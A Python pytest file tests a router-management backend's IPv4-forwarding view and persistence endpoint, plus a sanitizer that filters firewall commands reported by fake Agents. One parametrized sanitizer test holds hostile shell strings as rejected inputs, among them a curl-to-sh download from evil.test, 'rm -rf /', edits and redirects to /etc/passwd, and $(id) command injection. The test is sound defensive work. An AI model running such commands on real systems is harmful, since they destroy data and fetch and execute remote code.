"""The 上游路由 page's IPv4 forwarding view and one-click persistence, with fake Agents."""
from datetime import datetime, timedelta
import json

import pytest
import requests

from backend.agents import linux_gateway as bridge
from backend.test_agent_upgrade_auth import authenticated_app  # noqa: F401

STANDALONE = bridge.STANDALONE_FORWARDING_MIN_AGENT_VERSION
AIO = bridge.FORWARDING_MIN_AGENT_VERSION
PATH = '/api/routers/gateway-forwarding'


def forwarding(**fields):
    return {'protocol': 1, 'supported': True, 'current': '1', 'config': 'managed', 'hook_script': 'managed',
            'startup_hook': 'registered', 'persisted': True, 'layout': 'standalone', **fields}


def status(managed=None, top_supported=True, **fields):
    return {'success': True, 'supported': top_supported, 'managed': managed or {'active': False},
            'ipv4_forwarding': forwarding(**fields)}


class Reply:
    def __init__(self, payload, code=200):
        self.status_code = code
        self.raw = payload if isinstance(payload, bytes) else json.dumps(payload).encode()

    def __enter__(self): return self
    def __exit__(self, *args): pass
    def iter_content(self, size):
        yield self.raw


@pytest.fixture
def home(authenticated_app, monkeypatch):
    """A profile whose routers point at fake Agents; replies are keyed by Agent port."""
    client, manager, _, admin, _ = authenticated_app
    repository = manager.repository
    repository.create_profile({'id': 'home', 'name': 'Home'})
    repository.create_profile({'id': 'other', 'name': 'Other'})
    seen, replies = [], {}

    def request(session, method, url, **kwargs):
        port = int(url.split('//', 1)[1].split('/', 1)[0].rsplit(':', 1)[1])
        operation = url.rsplit('/', 1)[1]
        seen.append((port, method, operation, kwargs.get('json')))
        reply = replies.get((port, operation))
        if isinstance(reply, Exception):
            raise reply
        return reply if isinstance(reply, Reply) else Reply(reply or {'success': True})
    monkeypatch.setattr(requests.Session, 'request', request)

    def agent(port, **fields):
        data = {'name': f'agent-{port}', 'host': '127.0.0.1', 'port': port, 'service_type': 'mihomo',
                'deployment_method': 'shell', 'version': STANDALONE, 'profile_id': 'home'}
        registered = manager.register_agent({**data, **{k: v for k, v in fields.items() if k in data}})
        extra = {k: v for k, v in fields.items() if k not in data}
        if extra:  # Heartbeat fields, which only the Agent's own reports change.
            def change(agents):
                for item in agents:
                    if item['id'] == registered['id']:
                        item.update(extra)
            manager._update_agents(change)
        return registered['id']

    def routers(profile, *links):
        items = [{'id': f'r{index}', 'name': f'路由器{index}', 'type': 'routeros', 'endpoint': 'https://r.test',
                  'username': 'u', 'password': 'p', 'proxy_gateway_agent_id': link}
                 for index, link in enumerate(links, 1)]
        repository.save_profile(profile, {'routers': {'items': items}})

    headers = {**admin, 'X-ConfigFlow-Profile': 'home'}
    return client, headers, agent, routers, seen, replies


def entries(client, headers):
    response = client.get(PATH, headers=headers)
    assert response.status_code == 200, response.get_json()
    assert response.headers['Cache-Control'] == 'no-store'
    return response.get_json()['gateways']


def test_view_lists_each_proxy_gateway_once_in_router_order(home):
    client, headers, agent, routers, seen, replies = home
    first, second = agent(9001), agent(9002)
    routers('home', second, '', first, second)
    replies[(9001, 'status')] = status()
    replies[(9002, 'status')] = status(current='0', persisted=False, config='absent')
    result = entries(client, headers)
    assert [item['agent_id'] for item in result] == [second, first]
    assert result[0]['routers'] == [{'id': 'r1', 'name': '路由器1'}, {'id': 'r4', 'name': '路由器4'}]
    assert result[0]['state'] == 'needs_persist' and result[0]['can_persist'] is True
    assert result[0]['current'] == '0' and result[0]['config'] == 'absent'
    assert result[1]['state'] == 'persisted' and result[1]['can_persist'] is False
    assert result[1]['layout'] == 'standalone' and result[1]['agent_name'] == 'agent-9001'
    assert sorted(item[2] for item in seen) == ['status', 'status']


def test_view_uses_the_routers_profile_not_the_agents_binding(home):
    client, headers, agent, routers, seen, replies = home
    elsewhere = agent(9003, profile_id='other')
    routers('home', elsewhere)
    routers('other', '')
    replies[(9003, 'status')] = status()
    assert [item['state'] for item in entries(client, headers)] == ['persisted']
    assert entries(client, {**headers, 'X-ConfigFlow-Profile': 'other'}) == []


@pytest.mark.parametrize('fields,reply,state,message', [
    (None, None, 'missing', bridge.GATEWAY_FORWARDING_MESSAGES['missing']),
    ({'service_type': 'oxidns'}, None, 'not_mihomo', bridge.GATEWAY_FORWARDING_MESSAGES['not_mihomo']),
    ({'deployment_method': 'docker'}, None, 'docker', bridge.GATEWAY_FORWARDING_MESSAGES['docker']),
    ({'status': 'offline'}, None, 'offline', 'Agent 离线。'),
    ({'last_heartbeat': (datetime.now() - timedelta(minutes=5)).isoformat()}, None, 'offline', 'Agent 离线。'),
    ({'version': '1.8.24-go'}, None, 'upgrade_required', bridge.GATEWAY_FORWARDING_MESSAGES['upgrade_required']),
    ({'version': '1.8.39-go'}, None, 'upgrade_required', bridge.GATEWAY_FORWARDING_MESSAGES['upgrade_required']),
    ({}, Reply(b'not found', 404), 'upgrade_required', bridge.GATEWAY_FORWARDING_MESSAGES['upgrade_required']),
    ({}, Reply({'success': False, 'message': '忙'}, 409), 'error', '忙'),
    ({}, requests.ConnectionError('down'), 'error', '暂时无法连接 Agent，请检查设备连接。'),
    ({'version': AIO}, status(supported=False, unsupported_reason='仅支持普通 Shell 同机安装'), 'upgrade_required',
     bridge.STANDALONE_UPGRADE),
    ({}, status(top_supported=False, supported=False, unsupported_reason='Agent 需要 root 权限'), 'unsupported',
     'Agent 需要 root 权限'),
    ({}, status(config='foreign', persisted=False), 'blocked', bridge.GATEWAY_FORWARDING_MESSAGES['config_blocked']),
    ({}, status(config='symlink', persisted=False), 'blocked', bridge.GATEWAY_FORWARDING_MESSAGES['config_blocked']),
    ({}, status(hook_script='modified', persisted=False), 'blocked', bridge.GATEWAY_FORWARDING_MESSAGES['hook_blocked']),
    ({}, status(current='1', persisted=False, startup_hook='missing'), 'needs_persist', ''),
    ({}, status(current='', persisted=False, error='无法读取 IPv4 转发状态'), 'needs_persist', '无法读取 IPv4 转发状态'),
    ({'version': AIO}, status(layout='native_aio'), 'persisted', ''),
])
def test_view_states(home, fields, reply, state, message):
    client, headers, agent, routers, seen, replies = home
    agent_id = 'deleted-agent' if fields is None else agent(9010, **fields)
    routers('home', agent_id)
    if reply is not None:
        replies[(9010, 'status')] = reply
    [entry] = entries(client, headers)
    assert (entry['state'], entry['message']) == (state, message)
    assert entry['can_persist'] is (state == 'needs_persist')
    assert entry['minimum_version'] == (STANDALONE if state == 'upgrade_required' else None)
    # Agents that cannot persist are never asked.
    assert len(seen) == (0 if reply is None else 1)


def test_view_reports_a_gateway_record_and_whether_removal_keeps_forwarding(home):
    client, headers, agent, routers, seen, replies = home
    routers('home', agent(9011))
    replies[(9011, 'status')] = status({'active': True, 'healthy': True, 'preserves_forwarding': False},
                                       current='1', persisted=False, config='absent')
    [entry] = entries(client, headers)
    assert entry['state'] == 'needs_persist'
    assert entry['gateway_record'] is True and entry['preserves_forwarding'] is False


def post(client, headers, body):
    response = client.post(PATH, headers=headers, json=body)
    assert response.headers['Cache-Control'] == 'no-store'
    return response.status_code, response.get_json()


def test_persist_posts_an_empty_request_and_returns_the_new_entry(home):
    client, headers, agent, routers, seen, replies = home
    agent_id = agent(9020)
    routers('home', agent_id, agent_id)
    replies[(9020, 'forwarding')] = {
        'success': True, 'message': 'IPv4 转发已开启并持久化', 'ipv4_forwarding': forwarding(),
        'managed': {'active': True, 'healthy': True, 'preserves_forwarding': True}}
    code, data = post(client, headers, {'agent_id': agent_id})
    assert code == 200, data
    assert seen == [(9020, 'POST', 'forwarding', {})]
    gateway = data['gateway']
    assert gateway['state'] == 'persisted' and gateway['agent_id'] == agent_id
    assert gateway['routers'] == [{'id': 'r1', 'name': '路由器1'}, {'id': 'r2', 'name': '路由器2'}]
    assert gateway['gateway_record'] is True and gateway['preserves_forwarding'] is True


def test_persist_on_an_aio_agent_below_1_8_41_reads_its_layout_first(home):
    client, headers, agent, routers, seen, replies = home
    agent_id = agent(9021, version=AIO)
    routers('home', agent_id)
    replies[(9021, 'status')] = status(layout='native_aio', current='0', persisted=False)
    replies[(9021, 'forwarding')] = {'success': True, 'ipv4_forwarding': forwarding(layout='native_aio'),
                                     'managed': {'active': False}}
    code, data = post(client, headers, {'agent_id': agent_id})
    assert code == 200, data
    assert [item[2] for item in seen] == ['status', 'forwarding']


def test_persist_on_a_single_service_agent_below_1_8_41_asks_for_an_update(home):
    client, headers, agent, routers, seen, replies = home
    agent_id = agent(9022, version=AIO)
    routers('home', agent_id)
    replies[(9022, 'status')] = status(supported=False, unsupported_reason='仅支持普通 Shell 同机安装')
    code, data = post(client, headers, {'agent_id': agent_id})
    assert (code, data['code'], data['message']) == (409, 'UPGRADE_REQUIRED', bridge.STANDALONE_UPGRADE)
    assert [item[2] for item in seen] == ['status']


@pytest.mark.parametrize('body', [None, {}, {'agent_id': 1}, {'agent_id': 'x', 'prepare_tun': True}, ['x']])
def test_persist_accepts_only_an_agent_id(home, body):
    client, headers, agent, routers, seen, replies = home
    routers('home', agent(9023))
    code, data = post(client, headers, body)
    assert (code, data['code']) == (400, 'INVALID_REQUEST')
    assert seen == []


def test_persist_needs_a_router_link_in_this_profile(home):
    client, headers, agent, routers, seen, replies = home
    agent_id = agent(9024)
    routers('home', '')
    routers('other', agent_id)
    code, data = post(client, headers, {'agent_id': agent_id})
    assert (code, data['code']) == (404, 'NOT_LINKED')
    code, data = post(client, {**headers, 'X-ConfigFlow-Profile': 'other'}, {'agent_id': agent_id})
    assert code == 200, data
    assert [item[2] for item in seen] == ['forwarding']


@pytest.mark.parametrize('fields,code,error', [
    ({'status': 'offline'}, 409, 'AGENT_OFFLINE'),
    ({'deployment_method': 'docker'}, 409, 'UNSUPPORTED_ENVIRONMENT'),
    ({'service_type': 'oxidns'}, 400, 'WRONG_SERVICE'),
    ({'version': '1.8.39-go'}, 409, 'UPGRADE_REQUIRED'),
])
def test_persist_refuses_agents_that_cannot_persist(home, fields, code, error):
    client, headers, agent, routers, seen, replies = home
    agent_id = agent(9025, **fields)
    routers('home', agent_id)
    status_code, data = post(client, headers, {'agent_id': agent_id})
    assert (status_code, data['code']) == (code, error)
    assert seen == []


def test_persist_refusal_by_the_agent_is_passed_through(home):
    client, headers, agent, routers, seen, replies = home
    agent_id = agent(9026)
    routers('home', agent_id)
    replies[(9026, 'forwarding')] = Reply({'success': False, 'message': 'Agent 服务存在未知的 ExecStartPre，拒绝修改'}, 409)
    code, data = post(client, headers, {'agent_id': agent_id})
    assert (code, data['code'], data['message']) == (409, 'GATEWAY_ERROR', 'Agent 服务存在未知的 ExecStartPre，拒绝修改')


def test_persist_of_a_deleted_agent(home):
    client, headers, agent, routers, seen, replies = home
    routers('home', 'deleted-agent')
    code, data = post(client, headers, {'agent_id': 'deleted-agent'})
    assert (code, data['code']) == (404, 'AGENT_NOT_FOUND')


# -- Full-TUN FORWARD filtering: a warning only ------------------------------

def docker_filter(**fields):
    """A may_drop report as Agent 1.8.42-go sends it for Docker's FORWARD policy."""
    return {
        'protocol': 1, 'state': 'may_drop', 'reason': '', 'device': 'Meta', 'auto_redirect': True, 'policy': 'drop',
        'input_policy': 'accept', 'flows': ['forward'], 'forward_protocols': ['udp', 'icmp'],
        'sources': [{'kind': 'docker', 'backend': 'nft', 'hook': 'forward', 'family': '', 'table': '', 'chain': '',
                     'policy': 'drop', 'detail': 'FORWARD 默认策略为 DROP（Docker）'}],
        'remedies': [{'source': 'docker', 'label': 'Docker', 'device': 'Meta',
                      'commands': ['iptables -I DOCKER-USER -o Meta -j ACCEPT', 'iptables -I DOCKER-USER -i Meta -j ACCEPT'],
                      'persist_note': '这两条规则重启后会丢失（重启 Docker 不会清空 DOCKER-USER）。'}],
        'hint': '这台 Linux 的防火墙可能拦截经过 Mihomo TUN（Meta）的流量：主路由转来的 UDP（如 QUIC、语音通话、游戏）和 ping 会失败；其他 TCP 连接不受影响。',
        'verify': '执行后回到这里刷新状态。', 'checked_at': '2026-10-24T03:00:00Z', 'cached': False, **fields}


def test_view_carries_the_sanitized_forward_filter_without_changing_the_state(home):
    client, headers, agent, routers, seen, replies = home
    first, second, third = agent(9030), agent(9031), agent(9032)
    routers('home', first, second, third)
    replies[(9030, 'status')] = {**status(), 'forward_filter': docker_filter()}
    replies[(9031, 'status')] = {**status(current='0', persisted=False, config='absent'),
                                 'forward_filter': docker_filter(state='ok', policy='accept', sources=[], remedies=[])}
    replies[(9032, 'status')] = status()  # An Agent before 1.8.42-go.
    result = entries(client, headers)
    assert [(item['state'], item['can_persist']) for item in result] == [
        ('persisted', False), ('needs_persist', True), ('persisted', False)]
    assert result[0]['forward_filter'] == docker_filter()
    assert result[1]['forward_filter']['state'] == 'ok'
    assert result[2]['forward_filter'] is None


@pytest.mark.parametrize('value', [None, 'may_drop', [], {'state': 'blocking'}, {'hint': 'x'}])
def test_view_drops_an_unusable_forward_filter(home, value):
    client, headers, agent, routers, seen, replies = home
    routers('home', agent(9033))
    replies[(9033, 'status')] = {**status(), 'forward_filter': value}
    [entry] = entries(client, headers)
    assert entry['state'] == 'persisted'
    assert entry['forward_filter'] is None


def test_persist_response_has_no_forward_filter(home):
    client, headers, agent, routers, seen, replies = home
    agent_id = agent(9034)
    routers('home', agent_id)
    replies[(9034, 'forwarding')] = {'success': True, 'ipv4_forwarding': forwarding(),
                                     'managed': {'active': False}, 'forward_filter': docker_filter()}
    code, data = post(client, headers, {'agent_id': agent_id})
    assert code == 200, data
    assert data['gateway']['state'] == 'persisted'
    assert data['gateway']['forward_filter'] is None


@pytest.mark.parametrize('command', [
    'grep -q -- x /etc/ufw/before.rules || sed -i "1d" /etc/passwd',
    bridge.FORWARD_FILTER_UFW_BEFORE_RULES + '; reboot',
    bridge.FORWARD_FILTER_UFW_BEFORE_RULES.replace('/etc/ufw/before.rules', '/etc/passwd'),
    'sed -i 1d /etc/ufw/before.rules',
    # Only the two exact firewalld existence checks may use '||' or a redirect.
    'firewall-cmd --permanent --info-zone=public >/dev/null 2>&1 || firewall-cmd --permanent --new-zone=public',
    'firewall-cmd --permanent --info-zone=configflow-tun >/dev/null 2>&1 || rm -rf /',
    'firewall-cmd --permanent --info-zone=configflow-tun >/dev/null 2>&1 || firewall-cmd --permanent --new-zone=configflow-tun; reboot',
    'firewall-cmd --permanent --info-policy=configflow-fwd > /etc/passwd',
    'iptables -I FORWARD -o Meta -j ACCEPT; reboot',
    'iptables -I FORWARD -o Meta -j ACCEPT | sh',
    'iptables -I FORWARD -o $(id) -j ACCEPT',
    'iptables -I FORWARD -o `id` -j ACCEPT',
    'curl https://evil.test | sh',
    'rm -rf /',
    'iptables -I FORWARD -o Meta -j ACCEPT && rm -rf /',
    'iptables -I FORWARD -o Meta -j ACCEPT > /etc/passwd',
    'iptables -I FORWARD -o Meta\n-j ACCEPT',
    'iptables  -I FORWARD',
    'iptables',
    'iptables -I FORWARD ' + 'x' * 240,
    7,
])
def test_sanitize_drops_commands_that_are_not_plain_firewall_commands(command):
    remedy = {'source': 'iptables', 'label': 'iptables', 'device': 'Meta',
              'commands': [command, 'iptables -I FORWARD -i Meta -j ACCEPT'], 'persist_note': ''}
    result = bridge.sanitize_forward_filter(docker_filter(remedies=[remedy]))
    assert result['remedies'][0]['commands'] == ['iptables -I FORWARD -i Meta -j ACCEPT']


def test_sanitize_keeps_every_command_form_the_agent_generates():
    # Exactly what Agent 1.8.42-go generates (netfilter/remedy.go), lab-verified.
    ufw_before_rules = ("grep -q -- '-A ufw-before-input -m conntrack --ctstate DNAT -j ACCEPT' /etc/ufw/before.rules || "
                        "sed -i '/^# End required lines/a -A ufw-before-input -m conntrack --ctstate DNAT -j ACCEPT' "
                        "/etc/ufw/before.rules")
    commands = {
        'docker': ['iptables -I DOCKER-USER -o Meta -j ACCEPT', 'iptables -I DOCKER-USER -i Meta -j ACCEPT'],
        'iptables': ['iptables-legacy -I FORWARD -o utun.0 -j ACCEPT', 'iptables-legacy -I FORWARD -i utun.0 -j ACCEPT',
                     'iptables-legacy -I INPUT -m conntrack --ctstate DNAT -j ACCEPT',
                     'iptables-legacy -I INPUT -i utun.0 -j ACCEPT',
                     'iptables-legacy -I INPUT -i eth0 -p udp --dport 53 -j ACCEPT',
                     'iptables-legacy -I INPUT -i eth0 -p tcp --dport 53 -j ACCEPT'],
        'nftables': ['nft \'insert rule inet filter forward oifname "Meta" accept\'',
                     'nft \'insert rule inet filter forward iifname "Meta" accept\'',
                     "nft 'insert rule inet filter input ct status dnat accept'",
                     'nft \'insert rule inet filter input iifname "Meta" accept\'',
                     'nft \'insert rule inet filter input iifname "eth0" udp dport 53 accept\'',
                     'nft \'insert rule inet filter input iifname "eth0" tcp dport 53 accept\''],
        'firewalld': ['firewall-cmd --permanent --info-zone=configflow-tun >/dev/null 2>&1 || '
                      'firewall-cmd --permanent --new-zone=configflow-tun',
                      'firewall-cmd --permanent --zone=configflow-tun --set-target=ACCEPT',
                      'firewall-cmd --permanent --zone=configflow-tun --change-interface=Meta',
                      'firewall-cmd --permanent --info-policy=configflow-fwd >/dev/null 2>&1 || '
                      'firewall-cmd --permanent --new-policy=configflow-fwd',
                      'firewall-cmd --permanent --policy=configflow-fwd --add-ingress-zone=ANY',
                      'firewall-cmd --permanent --policy=configflow-fwd --add-egress-zone=configflow-tun',
                      'firewall-cmd --permanent --policy=configflow-fwd --set-target=ACCEPT',
                      'firewall-cmd --permanent --zone=public --add-service=dns',
                      'firewall-cmd --reload'],
        'ufw': ['ufw route allow in on Meta', 'ufw route allow out on Meta', 'ufw allow in on Meta',
                'ufw allow in on eth0 to any port 53', ufw_before_rules, 'ufw reload'],
    }
    assert ufw_before_rules == bridge.FORWARD_FILTER_UFW_BEFORE_RULES
    remedies = [{'source': source, 'label': source, 'device': 'Meta', 'commands': lines, 'persist_note': 'n'}
                for source, lines in commands.items()]
    result = bridge.sanitize_forward_filter(docker_filter(remedies=remedies))
    assert {remedy['source']: remedy['commands'] for remedy in result['remedies']} == commands


def test_sanitize_keeps_only_known_forward_protocols():
    # Only ping is dropped: the panel must not claim UDP is blocked.
    assert bridge.sanitize_forward_filter(docker_filter(forward_protocols=['icmp']))['forward_protocols'] == ['icmp']
    assert bridge.sanitize_forward_filter(docker_filter(
        forward_protocols=['icmp', 'sctp', 'tcp', {}, 'udp; reboot', 'tcp']))['forward_protocols'] == ['tcp', 'icmp']
    # An Agent that does not report them, or a report without a forward flow.
    assert bridge.sanitize_forward_filter(docker_filter(forward_protocols=None))['forward_protocols'] == []
    without = docker_filter()
    del without['forward_protocols']
    assert bridge.sanitize_forward_filter(without)['forward_protocols'] == []
    assert bridge.sanitize_forward_filter(docker_filter(flows=['local_dns']))['forward_protocols'] == []


def test_sanitize_reduces_fields_to_known_values():
    result = bridge.sanitize_forward_filter(docker_filter(
        protocol='1', reason='Timeout!', device='bad device', auto_redirect='yes', policy='reject',
        hint='第一行\n‮第二行' + '长' * 500, verify=5, input_policy='reject', flows=['tun_tcp', 'local_dns', 'forward', 'bogus', {}, 'forward'], checked_at='2026-10-24T03:00:00Z' + 'z' * 60, cached=1,
        extra='ignored',
        sources=[{'kind': 'nftables', 'backend': 'other', 'family': 'inet', 'table': 'filter', 'chain': 'for ward',
                  'policy': 'drop', 'detail': '\x1b[31mred'}, {'kind': 'shell'}, 'x'] * 4,
        remedies=[{'source': 'docker', 'label': 'L' * 100, 'device': 'Meta', 'commands': ['ufw route allow in on Meta'] * 14,
                   'persist_note': None}, {'source': 'cron', 'commands': ['ufw status']}, None] * 4))
    assert set(result) == {'protocol', 'state', 'reason', 'device', 'auto_redirect', 'policy', 'input_policy', 'flows',
                           'forward_protocols', 'sources', 'remedies', 'hint', 'verify', 'checked_at', 'cached'}
    assert (result['input_policy'], result['flows']) == ('', ['forward', 'local_dns', 'tun_tcp'])
    assert result['forward_protocols'] == ['udp', 'icmp']
    assert (result['protocol'], result['reason'], result['device'], result['auto_redirect'], result['policy'],
            result['cached']) == (0, '', '', False, '', False)
    assert result['hint'].startswith('第一行第二行') and len(result['hint']) == 400
    assert result['verify'] == '' and len(result['checked_at']) == 40
    assert len(result['sources']) == 4
    assert result['sources'][0] == {'kind': 'nftables', 'backend': '', 'hook': '', 'family': 'inet', 'table': 'filter',
                                    'chain': '', 'policy': 'drop', 'detail': '[31mred'}
    assert len(result['remedies']) == 4
    assert result['remedies'][0]['label'] == 'L' * 80
    assert len(result['remedies'][0]['commands']) == bridge.FORWARD_FILTER_MAX_COMMANDS
    assert result['remedies'][0]['persist_note'] == ''


def test_sanitize_limits_groups_and_needs_a_valid_device_for_commands():
    remedy = {'source': 'ufw', 'label': 'UFW', 'device': 'Meta', 'commands': ['ufw route allow in on Meta']}
    many = bridge.sanitize_forward_filter(docker_filter(remedies=[remedy] * 9,
                                                        sources=[{'kind': 'ufw', 'policy': 'drop'}] * 12))
    assert len(many['remedies']) == bridge.FORWARD_FILTER_MAX_REMEDIES
    assert len(many['sources']) == bridge.FORWARD_FILTER_MAX_SOURCES
    manual = bridge.sanitize_forward_filter(docker_filter(remedies=[{**remedy, 'device': 'Meta;x'}]))
    assert manual['remedies'] == [{'source': 'ufw', 'label': 'UFW', 'device': '', 'commands': [], 'persist_note': ''}]


@pytest.mark.parametrize('state', sorted(bridge.FORWARD_FILTER_STATES))
def test_sanitize_accepts_each_agent_state(state):
    value = {'protocol': 1, 'state': state, 'reason': 'linux_gateway' if state == 'not_applicable' else '',
             'sources': [], 'remedies': []}
    result = bridge.sanitize_forward_filter(value)
    assert result['state'] == state and result['sources'] == [] and result['remedies'] == []


def test_view_recognises_forwarding_the_host_persisted_itself(home):
    """Agent 1.8.43-go reports a sysctl file that persists forwarding outside ConfigFlow."""
    client, headers, agent, routers, seen, replies = home
    routers('home', agent(9040))
    replies[(9040, 'status')] = status(current='1', persisted=False, config='absent', hook_script='absent',
                                       startup_hook='absent', system_persisted=True,
                                       system_source='/etc/sysctl.d/99-ip-forward.conf:1')
    [entry] = entries(client, headers)
    assert entry['state'] == 'system_persisted'
    assert entry['system_source'] == '/etc/sysctl.d/99-ip-forward.conf:1'
    # ConfigFlow's own persistence stays available: only it survives removing a gateway record.
    assert entry['can_persist'] is True and entry['persisted'] is False


@pytest.mark.parametrize('fields,state,source', [
    # Off right now: the configuration only takes effect at boot, so it still needs turning on.
    ({'current': '0', 'persisted': False, 'system_persisted': True, 'system_source': '/etc/sysctl.d/a.conf:1'}, 'needs_persist', None),
    # ConfigFlow's own persistence wins.
    ({'current': '1', 'persisted': True, 'system_persisted': True, 'system_source': '/etc/sysctl.d/a.conf:1'}, 'persisted', None),
    # An Agent before 1.8.43-go sends neither field.
    ({'current': '1', 'persisted': False}, 'needs_persist', None),
    # A malformed source is dropped, the state is kept.
    ({'current': '1', 'persisted': False, 'system_persisted': True, 'system_source': 'x\n' * 200}, 'system_persisted', None),
    ({'current': '1', 'persisted': False, 'system_persisted': 'yes'}, 'needs_persist', None),
])
def test_view_system_persistence_edges(home, fields, state, source):
    client, headers, agent, routers, seen, replies = home
    routers('home', agent(9041))
    replies[(9041, 'status')] = status(**fields)
    [entry] = entries(client, headers)
    assert (entry['state'], entry['system_source']) == (state, source)


def test_persisting_a_system_persisted_host_switches_to_configflow_persistence(home):
    client, headers, agent, routers, seen, replies = home
    agent_id = agent(9042)
    routers('home', agent_id)
    replies[(9042, 'forwarding')] = {'success': True, 'ipv4_forwarding': forwarding(system_persisted=True,
                                     system_source='/etc/sysctl.d/99-ip-forward.conf:1'), 'managed': {'active': False}}
    code, data = post(client, headers, {'agent_id': agent_id})
    assert code == 200, data
    assert data['gateway']['state'] == 'persisted' and data['gateway']['system_source'] is None


def test_view_explains_openrc_sysctl_service_outside_runlevels(home):
    """ConfigFlow's files are in place, but OpenRC never applies sysctl.d at boot: the Agent's
    notice says so, and one-click persistence (which adds the service to boot) stays offered."""
    client, headers, agent, routers, seen, replies = home
    routers('home', agent(9043))
    notice = 'OpenRC 的 sysctl 服务没有加入任何运行级别；开启并持久化时会自动执行 rc-update add sysctl boot。'
    replies[(9043, 'status')] = status(current='1', persisted=False, boot_sysctl='disabled', notice=notice)
    [entry] = entries(client, headers)
    assert entry['state'] == 'needs_persist' and entry['can_persist'] is True
    assert entry['message'] == notice
    # A real read error still takes precedence over the notice.
    replies[(9043, 'status')] = status(current='1', persisted=False, notice=notice, error='无法读取 IPv4 转发状态')
    [entry] = entries(client, headers)
    assert entry['message'] == '无法读取 IPv4 转发状态'
